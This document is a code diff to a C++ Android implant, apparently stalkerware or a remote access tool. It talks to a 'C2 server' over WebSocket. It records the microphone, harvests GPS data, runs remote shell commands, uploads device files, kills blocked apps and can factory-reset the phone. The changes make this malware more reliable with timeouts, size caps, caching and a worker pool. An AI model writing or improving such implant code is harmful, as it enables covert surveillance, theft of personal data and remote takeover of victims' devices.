@@ -11,25 +11,23 @@
 
 // C++ Standard Library
 #include <algorithm>
-#include <array>
 #include <atomic>
 #include <chrono>
 #include <condition_variable>
 #include <fstream>
 #include <functional>
-#include <memory>
 #include <mutex>
 #include <queue>
 #include <sstream>
 #include <string>
 #include <thread>
-#include <unordered_map>
 #include <utility>
 #include <vector>
 
 // POSIX
 #include <dirent.h>
 #include <fcntl.h>
+#include <signal.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <unistd.h>
@@ -71,8 +69,6 @@ static constexpr const char* DISABLE_FILE = "/data/local/tmp/reporter_disable";
 static constexpr const char* GPS_FILE = "/data/local/tmp/gps_history.csv";
 static constexpr const char* MIC_FILE = "/data/local/tmp/mic.wav";
 static constexpr const char* LOC_FILE = "/data/local/tmp/location_enabled";
-static constexpr const char* INSTALLED_PACKAGES_FILE = "/data/system/packages.list";
-
 // Log rotation settings
 static constexpr bool ENABLE_FILE_LOGGING = false;
 static constexpr long MAX_LOG_SIZE = 1024 * 1024; // 1 MB
@@ -87,10 +83,6 @@ std::mutex g_log_mutex;
 
 // WebSocket send serialization
 std::mutex g_ws_mutex;
-
-// C2 endpoint fallback support
-std::vector<std::string> g_c2_urls;
-size_t g_c2_url_index = 0;
 
 // Device identity (cached at startup)
 std::string g_device_id;
@@ -115,7 +107,7 @@ static constexpr int WORKER_THREAD_COUNT = 4;
 std::queue<std::function<void()>> g_workerQueue;
 std::mutex g_workerQueueMutex;
 std::condition_variable g_workerQueueCV;
-bool g_workerShutdown = false;
+std::atomic<bool> g_workerShutdown{false};
 
 // Report state tracking (delta-based reporting)
 std::atomic<int> g_ping_interval{60};
@@ -132,6 +124,19 @@ int g_screen_time_minutes = 0;
 std::string g_last_screen_time_report_key;
 std::chrono::steady_clock::time_point g_screen_time_last_update;
 bool g_first_report = true;
+
+// Cached GPS coordinates (avoid file I/O on every report cycle)
+double g_cached_gps_lat = 0.0;
+double g_cached_gps_lon = 0.0;
+bool g_cached_gps_valid = false;
+time_t g_cached_gps_time = 0;
+static constexpr int COORDS_CACHE_TTL_S = 8; // seconds
+
+// Cached battery/charging state (sysfs reads batched every 30 seconds)
+int g_cached_battery_level = -1;
+int g_cached_charging_state = -1;
+time_t g_cached_battery_time = 0;
+static constexpr int BATTERY_CACHE_TTL_S = 30; // seconds
 
 // Pre-escaped JSON strings (populated once at startup, avoids per-report allocations)
 std::string g_escaped_implant_key;
@@ -216,6 +221,7 @@ std::vector<std::string> split_command_line(const std::string& command_line);
 bool enqueue_task(std::function<void()> task);
 bool websocket_send_text(const std::string& message);
 bool websocket_send_binary(const std::string& data);
+bool save_ping_interval_to_file(int interval);
 void rotate_logs();
 
 // ── Process Execution ────────────────────────────────────────────────────────
@@ -347,17 +353,42 @@ std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
     }
 
     close(pipefd[1]);
+    static constexpr size_t MAX_OUTPUT_SIZE = 1024 * 1024; // 1 MB cap
     std::string result;
     char buffer[2048];
     ssize_t count;
     while ((count = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
+        if (result.size() + static_cast<size_t>(count) > MAX_OUTPUT_SIZE) {
+            result.append(buffer, MAX_OUTPUT_SIZE - result.size());
+            log_message("Command output truncated at 1 MB limit.");
+            break;
+        }
         result.append(buffer, static_cast<size_t>(count));
     }
     close(pipefd[0]);
 
+    // Wait for child with a timeout (120s) to prevent infinite hangs
     int status = 0;
-    waitpid(pid, &status, 0);
-    bool success = WIFEXITED(status) && WEXITSTATUS(status) == 0;
+    bool child_exited = false;
+    for (int wait_cycles = 0; wait_cycles < 120; ++wait_cycles) {
+        pid_t ret = waitpid(pid, &status, WNOHANG);
+        if (ret == pid) {
+            child_exited = true;
+            break;
+        }
+        if (ret == -1) {
+            child_exited = true;
+            break;
+        }
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+    if (!child_exited) {
+        kill(pid, SIGKILL);
+        waitpid(pid, &status, 0);
+        log_message("Child process killed after 120s timeout: " + joined);
+        send_error_to_server("exec_cmd", "Child process timed out (120s) for: " + joined);
+    }
+    bool success = child_exited && WIFEXITED(status) && WEXITSTATUS(status) == 0;
 
     while (!result.empty() && std::isspace(static_cast<unsigned char>(result.back()))) {
         result.pop_back();
@@ -487,8 +518,23 @@ static bool parse_json_string(const std::string& json, size_t& pos, std::string&
 static bool skip_json_value(const std::string& json, size_t& pos);
 
 static bool skip_json_string(const std::string& json, size_t& pos) {
-    std::string unused;
-    return parse_json_string(json, pos, unused);
+    if (pos >= json.size() || json[pos] != '"') return false;
+    ++pos;
+    while (pos < json.size()) {
+        char c = json[pos++];
+        if (c == '\\') {
+            if (pos >= json.size()) return false;
+            if (json[pos] == 'u') {
+                pos += 5; // skip \uXXXX
+                if (pos > json.size()) return false;
+            } else {
+                ++pos; // skip escaped char
+            }
+            continue;
+        }
+        if (c == '"') return true;
+    }
+    return false;
 }
 
 static bool skip_json_value(const std::string& json, size_t& pos) {
@@ -593,12 +639,17 @@ std::string get_json_val(const std::string& json, const std::string& key) {
     if (json.empty() || key.empty()) return "";
 
     size_t pos = 0;
+    skip_json_whitespace(json, pos);
+    // Skip opening '{' if present (top-level object)
+    if (pos < json.size() && json[pos] == '{') ++pos;
+
     while (pos < json.size()) {
         skip_json_whitespace(json, pos);
-        if (pos >= json.size() || json[pos] != '"') {
-            ++pos;
-            continue;
-        }
+        if (pos >= json.size()) break;
+        // Skip commas between key-value pairs
+        if (json[pos] == ',') { ++pos; continue; }
+        // Expect a quoted key
+        if (json[pos] != '"') break;
 
         std::string current_key;
         if (!parse_json_string(json, pos, current_key)) {
@@ -718,7 +769,7 @@ bool is_location_enabled() {
 
 /** Writes the location tracking on/off state to the flag file. */
 void set_location_file(int status) {
-    int fd = open(LOC_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    int fd = open(LOC_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0666);
     if (fd >= 0) {
         char ch = status ? '1' : '0';
         write(fd, &ch, 1);
@@ -769,29 +820,40 @@ bool save_ping_interval_to_file(int interval) {
     return written == static_cast<ssize_t>(value.size());
 }
 
-/** Reads battery percentage directly from sysfs (0-100, or -1 on failure). */
+/** Reads battery percentage directly from sysfs (0-100, or -1 on failure). Caches for BATTERY_CACHE_TTL_S seconds. */
 int get_battery_level() {
+    time_t now = time(nullptr);
+    if (g_cached_battery_level >= 0 && now - g_cached_battery_time < BATTERY_CACHE_TTL_S) {
+        return g_cached_battery_level;
+    }
     int fd = open("/sys/class/power_supply/battery/capacity", O_RDONLY);
-    if (fd < 0) return -1;
+    if (fd < 0) return g_cached_battery_level;
     char buf[8];
     ssize_t n = read(fd, buf, sizeof(buf) - 1);
     close(fd);
-    if (n <= 0) return -1;
+    if (n <= 0) return g_cached_battery_level;
     buf[n] = '\0';
-    return atoi(buf);
+    g_cached_battery_level = atoi(buf);
+    g_cached_battery_time = now;
+    return g_cached_battery_level;
 }
 
-/** Returns 1 if charging or full, 0 otherwise. Reads sysfs directly. */
+/** Returns 1 if charging or full, 0 otherwise. Reads sysfs directly. Caches for BATTERY_CACHE_TTL_S seconds. */
 int get_charging_state() {
+    time_t now = time(nullptr);
+    if (g_cached_charging_state >= 0 && now - g_cached_battery_time < BATTERY_CACHE_TTL_S) {
+        return g_cached_charging_state;
+    }
     int fd = open("/sys/class/power_supply/battery/status", O_RDONLY);
-    if (fd < 0) return 0;
+    if (fd < 0) return g_cached_charging_state >= 0 ? g_cached_charging_state : 0;
     char buf[32];
     ssize_t n = read(fd, buf, sizeof(buf) - 1);
     close(fd);
-    if (n <= 0) return 0;
+    if (n <= 0) return g_cached_charging_state >= 0 ? g_cached_charging_state : 0;
     buf[n] = '\0';
     // "Charging\n" or "Full\n"
-    return (buf[0] == 'C' || buf[0] == 'F') ? 1 : 0;
+    g_cached_charging_state = (buf[0] == 'C' || buf[0] == 'F') ? 1 : 0;
+    return g_cached_charging_state;
 }
 
 // ── System Info ──────────────────────────────────────────────────────────────
@@ -860,6 +922,12 @@ std::string get_installed_apps() {
  *  avoiding the heavy CPU cost of forking `dumpsys location` every ping cycle.
  */
 bool get_location_from_gps_provider(double& lat, double& lon) {
+    time_t now = time(nullptr);
+    if (g_cached_gps_valid && now - g_cached_gps_time < COORDS_CACHE_TTL_S) {
+        lat = g_cached_gps_lat;
+        lon = g_cached_gps_lon;
+        return true;
+    }
     std::ifstream infile("/data/local/tmp/coords.txt");
     if (!infile.is_open()) {
         send_error_to_server("gps_read", "Cannot open /data/local/tmp/coords.txt");
@@ -873,6 +941,10 @@ bool get_location_from_gps_provider(double& lat, double& lon) {
             try {
                 lat = std::stod(line.substr(0, comma));
                 lon = std::stod(line.substr(comma + 1));
+                g_cached_gps_lat = lat;
+                g_cached_gps_lon = lon;
+                g_cached_gps_valid = true;
+                g_cached_gps_time = now;
                 return true;
             } catch (const std::exception& e) {
                 send_error_to_server("gps_parse", std::string("Malformed coords.txt: ") + e.what());
@@ -954,42 +1026,51 @@ void send_error_to_server(const std::string& error_source, const std::string& er
 
 /** Uploads a file to the C2 server: sends metadata JSON followed by raw binary. */
 void upload_file(const std::string& filepath, const std::string& type = "file") {
-    if (access(filepath.c_str(), F_OK) == -1) {
-        send_error_to_server("file_upload", "File not found: " + filepath);
-        return;
-    }
+    static constexpr std::streamsize MAX_UPLOAD_SIZE = 50 * 1024 * 1024; // 50 MB cap
+
     if (!websocket_is_open()) {
         send_error_to_server("file_upload", "WS not open, cannot upload: " + filepath);
         return;
     }
-    log_message("Uploading file natively: " + filepath);
-    
-    // First, send metadata
-    std::string meta_json = "{\"implant_key\":\"" + g_escaped_implant_key + "\", \"upload_type\":\"" + json_escape(type) + "\", \"filepath\":\"" + json_escape(filepath) + "\"}";
-    if (!websocket_send_text(meta_json)) {
-        send_error_to_server("file_upload", "WS not open, cannot upload: " + filepath);
+
+    // Open directly — avoids TOCTOU race between access() and open()
+    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
+    if (!file) {
+        send_error_to_server("file_upload", "Failed to open file: " + filepath);
         return;
     }
 
-    // Then, send binary file data (Optimized: Direct alloc, no stringstream)
-    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
-    if (file) {
-        std::streamsize size = file.tellg();
-        file.seekg(0, std::ios::beg);
-        
-        std::string buffer;
-        buffer.resize(size);
-        if (file.read(&buffer[0], size)) {
-            if (!websocket_send_binary(buffer)) {
-                send_error_to_server("file_upload", "WS not open, cannot upload: " + filepath);
-                return;
-            }
-            log_message("Upload finished natively via WS (" + std::to_string(size) + " bytes).");
-        } else {
-            send_error_to_server("file_upload", "Failed to read file content: " + filepath);
+    std::streamsize size = file.tellg();
+    if (size <= 0) {
+        send_error_to_server("file_upload", "File empty or unreadable: " + filepath);
+        return;
+    }
+    if (size > MAX_UPLOAD_SIZE) {
+        send_error_to_server("file_upload", "File too large (" + std::to_string(size) + " bytes, max " + std::to_string(MAX_UPLOAD_SIZE) + "): " + filepath);
+        return;
+    }
+
+    log_message("Uploading file natively: " + filepath + " (" + std::to_string(size) + " bytes)");
+
+    // Send metadata first
+    std::string meta_json = "{\"implant_key\":\"" + g_escaped_implant_key + "\", \"upload_type\":\"" + json_escape(type) + "\", \"filepath\":\"" + json_escape(filepath) + "\"}";
+    if (!websocket_send_text(meta_json)) {
+        send_error_to_server("file_upload", "WS not open, cannot send metadata: " + filepath);
+        return;
+    }
+
+    // Then send binary file data
+    file.seekg(0, std::ios::beg);
+    std::string buffer;
+    buffer.resize(static_cast<size_t>(size));
+    if (file.read(&buffer[0], size)) {
+        if (!websocket_send_binary(buffer)) {
+            send_error_to_server("file_upload", "WS not open, cannot send data: " + filepath);
+            return;
         }
+        log_message("Upload finished natively via WS (" + std::to_string(size) + " bytes).");
     } else {
-        send_error_to_server("file_upload", "Failed to open file for reading: " + filepath);
+        send_error_to_server("file_upload", "Failed to read file content: " + filepath);
     }
 }
 // ── Telemetry Reporting ─────────────────────────────────────────────────────
@@ -1012,9 +1093,11 @@ void do_report() {
     for (const auto& ef : app_error_files) {
         std::ifstream err_file(ef.path);
         if (err_file.is_open()) {
-            std::stringstream err_buffer;
-            err_buffer << err_file.rdbuf();
-            std::string errors = err_buffer.str();
+            static constexpr size_t MAX_ERR_READ = 8192; // 8 KB cap per error file
+            std::string errors;
+            errors.resize(MAX_ERR_READ);
+            err_file.read(&errors[0], MAX_ERR_READ);
+            errors.resize(static_cast<size_t>(err_file.gcount()));
             err_file.close();
             if (!errors.empty()) {
                 send_error_to_server(ef.source, errors);
@@ -1129,9 +1212,13 @@ void do_report() {
 
 /** Records audio from the device microphone for a specified duration using tinycap. */
 void do_mic_record(int duration_s) {
+    static constexpr int MAX_MIC_DURATION = 300; // 5 minutes cap
     if (duration_s <= 0) {
         log_message("Invalid or missing mic_record duration received; defaulting to 30 seconds.");
         duration_s = 30;
+    } else if (duration_s > MAX_MIC_DURATION) {
+        log_message("mic_record duration capped from " + std::to_string(duration_s) + " to " + std::to_string(MAX_MIC_DURATION) + " seconds.");
+        duration_s = MAX_MIC_DURATION;
     }
     std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
     log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
@@ -1160,9 +1247,11 @@ void do_gps_dump() {
     bool wrote_data = false;
     if (fd >= 0) {
         if (location_ok && !output.empty()) {
-            write(fd, output.data(), output.size());
-            write(fd, "\n", 1);
-            wrote_data = true;
+            ssize_t w = write(fd, output.data(), output.size());
+            if (w > 0) {
+                (void)write(fd, "\n", 1);
+                wrote_data = true;
+            }
         }
 
         auto [radio_ok, log_output] = exec_cmd(split_command_line("logcat -d -b radio"));
@@ -1173,9 +1262,11 @@ void do_gps_dump() {
             size_t line_len = (end == std::string::npos) ? log_output.size() - start : end - start;
             size_t gps_pos = log_output.find("GpsLocation", start);
             if (gps_pos != std::string::npos && gps_pos < start + line_len) {
-                write(fd, log_output.data() + start, line_len);
-                write(fd, "\n", 1);
-                wrote_data = true;
+                ssize_t w = write(fd, log_output.data() + start, line_len);
+                if (w > 0) {
+                    (void)write(fd, "\n", 1);
+                    wrote_data = true;
+                }
             }
             if (end == std::string::npos) break;
             start = end + 1;
@@ -1231,7 +1322,7 @@ void do_factory_reset() {
         result = success ? "[Factory reset command executed successfully with no output]" : "[Factory reset command failed with no output]";
     }
 
-    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
+    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"device_id\":\"" + g_escaped_device_id + "\",\"command_result\":\"" + json_escape(result) + "\"}";
     if (!websocket_send_text(json_req)) {
         send_error_to_server("factory_reset", "WS not open, cannot send result");
         return;
@@ -1264,12 +1355,12 @@ void process_tasks() {
             try {
                 duration = std::stoi(get_json_val(response, "duration"));
             } catch (const std::exception&) {}
-            std::thread([duration]() { do_mic_record(duration); }).detach(); // Async
+            enqueue_task([duration]() { do_mic_record(duration); });
         } else if (task == "gps_dump") {
-            std::thread([]() { do_gps_dump(); }).detach(); // Async
+            enqueue_task([]() { do_gps_dump(); });
         } else if (task == "shell") {
             std::string cmd = get_json_val(response, "command");
-            std::thread([cmd]() { do_shell_command(cmd); }).detach(); // Async
+            enqueue_task([cmd]() { do_shell_command(cmd); });
         } else if (task == "report") {
             log_message("Explicit report requested by C2 (will be handled by main loop).");
         } else if (task == "update_blocked_apps") {
@@ -1299,9 +1390,9 @@ void process_tasks() {
             if (track == 1) {
                 int interval = g_ping_interval.load();
                 std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
-                std::thread([cmd]() { exec_cmd(split_command_line(cmd)); }).detach();
+                enqueue_task([cmd]() { exec_cmd(split_command_line(cmd)); });
             } else {
-                std::thread([]() { exec_cmd(split_command_line("am force-stop com.stealthgps")); }).detach();
+                enqueue_task([]() { exec_cmd(split_command_line("am force-stop com.stealthgps")); });
             }
         } else if (task == "check_location_state") {
             log_message("Reporting location state explicitly (will be handled by main loop).");
@@ -1323,7 +1414,7 @@ void process_tasks() {
             log_message("Ping interval updated to: " + std::to_string(g_ping_interval.load()));
             if (is_location_enabled()) {
                 std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
-                std::thread([cmd]() { exec_cmd(split_command_line(cmd)); }).detach();
+                enqueue_task([cmd]() { exec_cmd(split_command_line(cmd)); });
             }
         } else if (task == "system_alert") {
             std::string state = get_json_val(response, "state");
@@ -1419,6 +1510,11 @@ int main(int argc, char* argv[]) {
     // Init IXWebSocket
     ix::initNetSystem();
 
+    // Start bounded worker thread pool for async tasks
+    for (int i = 0; i < WORKER_THREAD_COUNT; ++i) {
+        std::thread(worker_thread_loop).detach();
+    }
+
     // Ensure coords.txt exists with 0666 permissions so GpsService can write to it
     int fd = open("/data/local/tmp/coords.txt", O_WRONLY | O_CREAT, 0666);
     if (fd >= 0) {
@@ -1470,7 +1566,11 @@ int main(int argc, char* argv[]) {
             log_message("WS Command Received.");
             {
                 std::lock_guard<std::mutex> lock(g_taskMutex);
-                g_taskQueue.push(msg->str);
+                if (g_taskQueue.size() < 50) {
+                    g_taskQueue.push(msg->str);
+                } else {
+                    log_message("Task queue full (50); dropping incoming command.");
+                }
             }
             g_taskCV.notify_one(); // Wake up main thread instantly
         } else if (msg->type == ix::WebSocketMessageType::Open) {
@@ -1530,7 +1630,7 @@ int main(int argc, char* argv[]) {
                     run_command_no_output({"am", "force-stop", pkg});
                 }
             }
-            std::this_thread::sleep_for(std::chrono::seconds(2));
+            std::this_thread::sleep_for(std::chrono::seconds(30));
         }
     }).detach();
 
